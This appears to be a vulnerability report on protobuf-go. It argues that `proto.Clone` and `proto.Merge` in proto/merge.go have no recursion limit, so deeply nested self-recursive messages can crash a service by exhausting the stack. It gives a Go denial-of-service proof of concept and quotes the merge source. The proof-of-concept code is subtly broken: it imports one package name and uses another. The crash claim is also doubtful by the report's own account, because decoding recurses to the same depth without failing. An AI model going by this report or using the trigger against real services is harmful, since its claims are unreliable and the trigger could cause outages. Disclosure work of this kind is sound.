### Title
Unbounded recursion in `proto.Merge`/`proto.Clone` allows stack-exhaustion DoS on trusted, deeply-nested self-recursive messages - (File: `proto/merge.go`)

### Summary
`proto.Merge` and `proto.Clone` recursively walk nested message fields via `mergeOptions.mergeMessage` with **no recursion-depth limit**, unlike every unmarshal path in the same codebase (binary `proto.Unmarshal`, `protojson.Unmarshal`, `prototext.Unmarshal`), which all enforce a `RecursionLimit` (default `protowire.DefaultRecursionLimit = 10000`) and return `errRecursionDepth`/`"exceeded max(imum) recursion depth"` once exceeded. A message using a self-referential ("corecursive") field can be unmarshaled up to that limit and then, if the application calls `proto.Clone`/`proto.Merge` on it (a very common post-processing operation — e.g., to make a defensive copy of a decoded request before forwarding or storing it), the merge recursion has no independent bound and directly mirrors the CVE-2025-71382 pattern: a validation/limit that exists at parse time is absent from a later recursive-processing stage that walks the same trusted, already-parsed structure.

### Finding Description
Every decoder in this repository defends nested-message recursion:
- Binary: `internal/impl/decode.go` `unmarshalPointer` decrements `opts.depth` and returns `errRecursionDepth` [1](#0-0) ; `proto/decode.go`'s slow path does the same with `o.RecursionLimit` [2](#0-1) .
- `protojson`: `unmarshalMessage` decrements `d.opts.RecursionLimit` and errors at zero [3](#0-2) .
- `prototext`: analogous limit enforcement (confirmed via tests referencing `"exceeded maximum recursion depth"`).

In contrast, `proto/merge.go`'s `mergeMessage` recurses into every message-typed field, list element, and map value with **no counter, no limit parameter, and no error path for depth**: [4](#0-3) . The same lack of bound applies to `mergeList` and `mergeMap`, both of which call back into `mergeMessage` [5](#0-4) . `proto.Clone`/`CloneOf` are thin wrappers over the identical unbounded `mergeMessage` call [6](#0-5) .

Because the default unmarshal recursion limit is `10000` [7](#0-6) , an attacker who controls request bytes for any trusted-schema message containing a self-referential message field (a legitimate, common proto pattern — recursion is not a schema violation) can craft input that unmarshals successfully at, or just under, that depth. If the receiving service subsequently calls `proto.Clone` or `proto.Merge` on the decoded message (extremely common: defensive copies before mutation, merging defaults, forwarding a copy to another handler, `protobuf` middleware that clones requests), `mergeMessage` will recurse to a comparable depth with no limit and no opt-out, exhausting the goroutine stack and crashing the process — the same "parser accepts nested structure, but a later unbounded-recursion consumer walks it and crashes" pattern as the MuPDF/`value_from_inheritable_property()` bug.

### Impact Explanation
A successful trigger causes the Go runtime to panic with a fatal stack-overflow error (`runtime: goroutine stack exceeds ... — fatal error: stack overflow`), which is **not recoverable** by `recover()` and takes down the whole process, not just the handling goroutine. This is a process-wide denial of service reachable by any unprivileged party who can submit a message that the service will later clone/merge. Confidentiality and integrity of other data are unaffected; only availability is impacted, consistent with the CVSS profile of the original MuPDF report (`VA:H`, others `N`).

### Likelihood Explanation
Likelihood is moderate, not high, because it requires:
1. A trusted `.proto` schema that includes a self-referential (or mutually-recursive) message type — common in real-world protobufs (e.g., trees, ASTs, nested structs).
2. The service must call `proto.Merge`/`proto.Clone` on attacker-influenced decoded data, rather than only ever reading/reforwarding raw bytes. This is a very common idiom (e.g. cloning request messages, applying default merges, `protoreflect`-based frameworks), but it's not universal to every protobuf-go consumer — some services never clone incoming messages.
3. The attacker must build ~10000 levels of nesting bytes, which is a small, easily automatable payload (well under typical request size limits), so crafting the input itself is trivial once the merge/clone call is confirmed to exist.

### Recommendation
Add a recursion-depth guard to `mergeOptions`/`mergeMessage` (and by extension `mergeList`/`mergeMap`) in `proto/merge.go`, mirroring the `RecursionLimit`/`errRecursionDepth` pattern already used in `proto/decode.go`, `encoding/protojson/decode.go`, and `encoding/prototext/decode.go`, defaulting to `protowire.DefaultRecursionLimit`. Return an error (or panic with a clear, documented message, given `Merge`/`Clone` currently have no error return) once the limit is exceeded, so `proto.Merge`/`proto.Clone` cannot be driven into unbounded recursion by attacker-controlled, schema-legal recursive messages.

### Proof of Concept
```go
package main

import (
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/internal/testprotos/test" // any self-recursive test message w/ "corecursive" field
)

func buildDeeplyNested(depth int) *testpb.TestAllTypes {
	m := &testpb.TestAllTypes{}
	cur := m
	for i := 0; i < depth; i++ {
		next := &testpb.TestAllTypes_NestedMessage{Corecursive: &testpb.TestAllTypes{}}
		cur.OptionalNestedMessage = next
		cur = next.Corecursive
	}
	return m
}

func main() {
	// Attacker-controlled bytes: nested ~9999 levels deep, just under the
	// default binary unmarshal RecursionLimit (protowire.DefaultRecursionLimit = 10000),
	// so proto.Unmarshal succeeds normally.
	src := buildDeeplyNested(9999)
	b, _ := proto.Marshal(src)

	dst := &testpb.TestAllTypes{}
	_ = proto.Unmarshal(b, dst) // succeeds — within decode recursion limit

	// A very common follow-up operation in services: defensively clone the
	// decoded request before further processing/forwarding it.
	_ = proto.Clone(dst) // proto/merge.go mergeMessage recurses ~9999 levels
	// with NO recursion-depth check, unlike Unmarshal — can exhaust the
	// goroutine stack and crash the process with a fatal, unrecoverable
	// stack-overflow error.
}
```

// Clone returns a deep copy of m.
// If the top-level message is invalid, it returns an invalid message as well.
func Clone(m Message) Message {
	// NOTE: Most usages of Clone assume the following properties:
	//	t := reflect.TypeOf(m)
	//	t == reflect.TypeOf(m.ProtoReflect().New().Interface())
	//	t == reflect.TypeOf(m.ProtoReflect().Type().Zero().Interface())
	//
	// Embedding protobuf messages breaks this since the parent type will have
	// a forwarded ProtoReflect method, but the Interface method will return
	// the underlying embedded message type.
	if m == nil {
		return nil
	}
	src := m.ProtoReflect()
	if !src.IsValid() {
		return src.Type().Zero().Interface()
	}
	dst := src.New()
	mergeOptions{}.mergeMessage(dst, src)
	return dst.Interface()
}

func (o mergeOptions) mergeMessage(dst, src protoreflect.Message) {
	methods := protoMethods(dst)
	if methods != nil && methods.Merge != nil {
		in := protoiface.MergeInput{
			Destination: dst,
			Source:      src,
		}
		out := methods.Merge(in)
		if out.Flags&protoiface.MergeComplete != 0 {
			return
		}
	}

	if !dst.IsValid() {
		panic(fmt.Sprintf("cannot merge into invalid %v message", dst.Descriptor().FullName()))
	}

	src.Range(func(fd protoreflect.FieldDescriptor, v protoreflect.Value) bool {
		switch {
		case fd.IsList():
			o.mergeList(dst.Mutable(fd).List(), v.List(), fd)
		case fd.IsMap():
			o.mergeMap(dst.Mutable(fd).Map(), v.Map(), fd.MapValue())
		case fd.Message() != nil:
			o.mergeMessage(dst.Mutable(fd).Message(), v.Message())
		case fd.Kind() == protoreflect.BytesKind:
			dst.Set(fd, o.cloneBytes(v))
		default:
			dst.Set(fd, v)
		}
		return true
	})

	if len(src.GetUnknown()) > 0 {
		dst.SetUnknown(append(dst.GetUnknown(), src.GetUnknown()...))
	}
}

func (o mergeOptions) mergeList(dst, src protoreflect.List, fd protoreflect.FieldDescriptor) {
	// Merge semantics appends to the end of the existing list.
	for i, n := 0, src.Len(); i < n; i++ {
		switch v := src.Get(i); {
		case fd.Message() != nil:
			dstv := dst.NewElement()
			o.mergeMessage(dstv.Message(), v.Message())
			dst.Append(dstv)
		case fd.Kind() == protoreflect.BytesKind:
			dst.Append(o.cloneBytes(v))
		default:
			dst.Append(v)
		}
	}
}

func (o mergeOptions) mergeMap(dst, src protoreflect.Map, fd protoreflect.FieldDescriptor) {
	// Merge semantics replaces, rather than merges into existing entries.
	src.Range(func(k protoreflect.MapKey, v protoreflect.Value) bool {
		switch {
		case fd.Message() != nil:
			dstv := dst.NewValue()
			o.mergeMessage(dstv.Message(), v.Message())
			dst.Set(k, dstv)
		case fd.Kind() == protoreflect.BytesKind:
			dst.Set(k, o.cloneBytes(v))
		default:
			dst.Set(k, v)
		}
		return true
	})
}
